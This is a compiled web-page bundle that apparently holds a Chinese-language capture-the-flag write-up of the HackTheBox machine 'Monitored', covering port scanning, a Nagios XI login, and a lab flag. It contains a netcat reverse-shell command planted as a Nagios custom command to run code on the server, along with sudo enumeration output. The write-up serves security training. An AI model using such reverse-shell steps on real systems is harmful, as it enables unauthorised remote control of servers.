"use strict";(self.webpackChunktarget_machines_write_up=self.webpackChunktarget_machines_write_up||[]).push([[5819],{7172:(e,n,t)=>{t.r(n),t.d(n,{assets:()=>c,contentTitle:()=>o,default:()=>h,frontMatter:()=>a,metadata:()=>r,toc:()=>d});var s=t(85893),i=t(11151);const a={},o="Monitored",r={id:"HackTheBox/Machines/Monitored/index",title:"Monitored",description:"Difficulty: Medium",source:"@site/docs/HackTheBox/Machines/Monitored/index.md",sourceDirName:"HackTheBox/Machines/Monitored",slug:"/HackTheBox/Machines/Monitored/",permalink:"/Target-Machines-WriteUp/docs/HackTheBox/Machines/Monitored/",draft:!1,unlisted:!1,editUrl:"https://github.com/TryHackMyOffsecBox/Target-Machines-WriteUp/edit/main/docs/HackTheBox/Machines/Monitored/index.md",tags:[],version:"current",frontMatter:{},sidebar:"HackTheBox_Sidebar",previous:{title:"Mist",permalink:"/Target-Machines-WriteUp/docs/HackTheBox/Machines/Mist/"},next:{title:"Perfection",permalink:"/Target-Machines-WriteUp/docs/HackTheBox/Machines/Perfection/"}},c={},d=[{value:"nmap \u4fe1\u606f\u641c\u96c6",id:"nmap-\u4fe1\u606f\u641c\u96c6",level:2},{value:"\u63a2\u6d4b web \u670d\u52a1",id:"\u63a2\u6d4b-web-\u670d\u52a1",level:2},{value:"SNMP \u4fe1\u606f\u63a2\u6d4b",id:"snmp-\u4fe1\u606f\u63a2\u6d4b",level:2},{value:"\u767b\u9646\u540e\u5229\u7528",id:"\u767b\u9646\u540e\u5229\u7528",level:2},{value:"user pwned",id:"user-pwned",level:2},{value:"\u63d0\u6743\u63a2\u6d4b",id:"\u63d0\u6743\u63a2\u6d4b",level:2},{value:"\u53c2\u8003",id:"\u53c2\u8003",level:2}];function l(e){const n={a:"a",admonition:"admonition",code:"code",h1:"h1",h2:"h2",img:"img",p:"p",pre:"pre",...(0,i.a)(),...e.components};return(0,s.jsxs)(s.Fragment,{children:[(0,s.jsx)(n.h1,{id:"monitored",children:"Monitored"}),"\n",(0,s.jsxs)(n.admonition,{type:"info",children:[(0,s.jsx)(n.p,{children:"Difficulty: Medium"}),(0,s.jsx)(n.p,{children:"Operating System: Linux"})]}),"\n",(0,s.jsx)(n.h2,{id:"nmap-\u4fe1\u606f\u641c\u96c6",children:"nmap \u4fe1\u606f\u641c\u96c6"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-plaintext",children:"Nmap scan report for 10.10.11.248\nHost is up (0.13s latency).\nNot shown: 65530 closed tcp ports (reset)\nPORT     STATE SERVICE    VERSION\n22/tcp   open  ssh        OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)\n| ssh-hostkey:\n|   3072 61e2e7b41b5d46dc3b2f9138e66dc5ff (RSA)\n|   256 2973c5a58daa3f60a94aa3e59f675c93 (ECDSA)\n|_  256 6d7af9eb8e45c2026ad58d4db3a3376f (ED25519)\n80/tcp   open  http       Apache httpd 2.4.56\n|_http-title: Did not follow redirect to https://nagios.monitored.htb/\n|_http-server-header: Apache/2.4.56 (Debian)\n389/tcp  open  ldap       OpenLDAP 2.2.X - 2.3.X\n443/tcp  open  ssl/http   Apache httpd 2.4.56 ((Debian))\n|_http-title: Nagios XI\n|_ssl-date: TLS randomness does not represent time\n| ssl-cert: Subject: commonName=nagios.monitored.htb/organizationName=Monitored/stateOrProvinceName=Dorset/countryName=UK\n| Not valid before: 2023-11-11T21:46:55\n|_Not valid after:  2297-08-25T21:46:55\n|_http-server-header: Apache/2.4.56 (Debian)\n| tls-alpn:\n|_  http/1.1\n5667/tcp open  tcpwrapped\n"})}),"\n",(0,s.jsx)(n.p,{children:"\u5e76\u4e14\u901a\u8fc7 UDP \u626b\u63cf\uff0c\u53d1\u73b0 SNMP\uff08161\uff09\u4e5f\u5728\u8fd0\u884c"}),"\n",(0,s.jsx)(n.h2,{id:"\u63a2\u6d4b-web-\u670d\u52a1",children:"\u63a2\u6d4b web \u670d\u52a1"}),"\n",(0,s.jsx)(n.p,{children:"\u6dfb\u52a0 hosts \u8bb0\u5f55"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-plaintext",children:"10.10.11.248 nagios.monitored.htb\n"})}),"\n",(0,s.jsx)(n.p,{children:"\u5c1d\u8bd5\u76f4\u63a5\u8bbf\u95ee"}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.img,{alt:"\u76f4\u63a5\u8bbf\u95ee /",src:t(39383).Z+"",width:"1471",height:"881"})}),"\n",(0,s.jsx)(n.h2,{id:"snmp-\u4fe1\u606f\u63a2\u6d4b",children:"SNMP \u4fe1\u606f\u63a2\u6d4b"}),"\n",(0,s.jsx)(n.h2,{id:"\u767b\u9646\u540e\u5229\u7528",children:"\u767b\u9646\u540e\u5229\u7528"}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.img,{alt:"\u6210\u529f\u767b\u5f55",src:t(99327).Z+"",width:"1471",height:"881"})}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-plaintext",children:"Configure ->  Commands ->  Add New\n"})}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.img,{alt:"Commands",src:t(15586).Z+"",width:"1471",height:"881"})}),"\n",(0,s.jsx)(n.p,{children:"\u52a0\u4e0a\u4e00\u4e2a\u53cd\u5411 shell \u7684\u547d\u4ee4"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-shell",children:"nc -e /bin/bash 10.10.16.11 9999\n"})}),"\n",(0,s.jsx)(n.admonition,{type:"note",children:(0,s.jsx)(n.p,{children:"\u5efa\u8bae\u4f7f\u7528 netcat \u8fdb\u884c\u53cd\u5411 shell\uff0c\u76f4\u63a5 bash -c \u4e0d\u77e5\u9053\u4e3a\u4ec0\u4e48\u6ca1\u6709\u6210\u529f"})}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.img,{alt:"add reverse shell",src:t(55726).Z+"",width:"1471",height:"881"})}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-plaintext",children:"Monitoring -> Services -> Add New\n"})}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.img,{alt:"Services",src:t(58964).Z+"",width:"1471",height:"881"})}),"\n",(0,s.jsxs)(n.p,{children:["\u6267\u884c ",(0,s.jsx)(n.code,{children:"Run Check Command"})]}),"\n",(0,s.jsx)(n.p,{children:"\u6210\u529f\u5f97\u5230\u53cd\u5f39shell"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-shell",children:"\u250c\u2500[randark@randark-Parrot]\u2500[~/tmp/Hackthebox-Monitored]\n\u2514\u2500\u2500\u257c $pwncat-cs -lp 9999\n[13:07:28] Welcome to pwncat \ud83d\udc08!                                                                                                                                                                                            __main__.py:164\n[13:14:12] received connection from 10.10.11.248:53958                                                                                                                                                                           bind.py:84\n[13:14:14] 0.0.0.0:9999: normalizing shell path                                                                                                                                                                              manager.py:957\n[13:14:16] 10.10.11.248:53958: registered new host w/ db                                                                                                                                                                     manager.py:957\n(local) pwncat$ back\n(remote) nagios@monitored:/home/nagios$ whoami\nnagios\n"})}),"\n",(0,s.jsx)(n.h2,{id:"user-pwned",children:"user pwned"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-shell",children:"(remote) nagios@monitored:/home/nagios$ cat user.txt \n5a9412d810390fed6e458fe5dba7bf30\n"})}),"\n",(0,s.jsx)(n.h2,{id:"\u63d0\u6743\u63a2\u6d4b",children:"\u63d0\u6743\u63a2\u6d4b"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-plaintext",metastring:'title="sudo -l"',children:"Matching Defaults entries for nagios on localhost:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\n\nUser nagios may run the following commands on localhost:\n    (root) NOPASSWD: /etc/init.d/nagios start\n    (root) NOPASSWD: /etc/init.d/nagios stop\n    (root) NOPASSWD: /etc/init.d/nagios restart\n    (root) NOPASSWD: /etc/init.d/nagios reload\n    (root) NOPASSWD: /etc/init.d/nagios status\n    (root) NOPASSWD: /etc/init.d/nagios checkconfig\n    (root) NOPASSWD: /etc/init.d/npcd start\n    (root) NOPASSWD: /etc/init.d/npcd stop\n    (root) NOPASSWD: /etc/init.d/npcd restart\n    (root) NOPASSWD: /etc/init.d/npcd reload\n    (root) NOPASSWD: /etc/init.d/npcd status\n    (root) NOPASSWD: /usr/bin/php /usr/local/nagiosxi/scripts/components/autodiscover_new.php *\n    (root) NOPASSWD: /usr/bin/php /usr/local/nagiosxi/scripts/send_to_nls.php *\n    (root) NOPASSWD: /usr/bin/php /usr/local/nagiosxi/scripts/migrate/migrate.php *\n    (root) NOPASSWD: /usr/local/nagiosxi/scripts/components/getprofile.sh\n    (root) NOPASSWD: /usr/local/nagiosxi/scripts/upgrade_to_latest.sh\n    (root) NOPASSWD: /usr/local/nagiosxi/scripts/change_timezone.sh\n    (root) NOPASSWD: /usr/local/nagiosxi/scripts/manage_services.sh *\n    (root) NOPASSWD: /usr/local/nagiosxi/scripts/reset_config_perms.sh\n    (root) NOPASSWD: /usr/local/nagiosxi/scripts/manage_ssl_config.sh *\n    (root) NOPASSWD: /usr/local/nagiosxi/scripts/backup_xi.sh *\n"})}),"\n",(0,s.jsx)(n.h2,{id:"\u53c2\u8003",children:"\u53c2\u8003"}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.a,{href:"https://gist.github.com/Acters/058b0421dba28860afd5559db6a7afee",children:"Acters/Monitored.sh - Github Gist"})})]})}function h(e={}){const{wrapper:n}={...(0,i.a)(),...e.components};return n?(0,s.jsx)(n,{...e,children:(0,s.jsx)(l,{...e})}):l(e)}},99327:(e,n,t)=>{t.d(n,{Z:()=>s});const s=t.p+"assets/images/image_20240104-130436-cfa72822a511ee2e5795fe0eb0077a2c.png"},15586:(e,n,t)=>{t.d(n,{Z:()=>s});const s=t.p+"assets/images/image_20240105-130554-15c4e750ac1036c4ec9580a40e38b561.png"},55726:(e,n,t)=>{t.d(n,{Z:()=>s});const s=t.p+"assets/images/image_20240109-130936-ece505948362fe5734a02bda6475c592.png"},58964:(e,n,t)=>{t.d(n,{Z:()=>s});const s=t.p+"assets/images/image_20240111-131120-f7fa83dc8a848c5ba21ce35785fc43a9.png"},39383:(e,n,t)=>{t.d(n,{Z:()=>s});const s=t.p+"assets/images/image_20240132-123225-d1d72f92a40677bbfff7d2c2cbe0b82f.png"},11151:(e,n,t)=>{t.d(n,{Z:()=>r,a:()=>o});var s=t(67294);const i={},a=s.createContext(i);function o(e){const n=s.useContext(a);return s.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function r(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(i):e.components||i:o(e.components),s.createElement(a.Provider,{value:n},e.children)}}}]);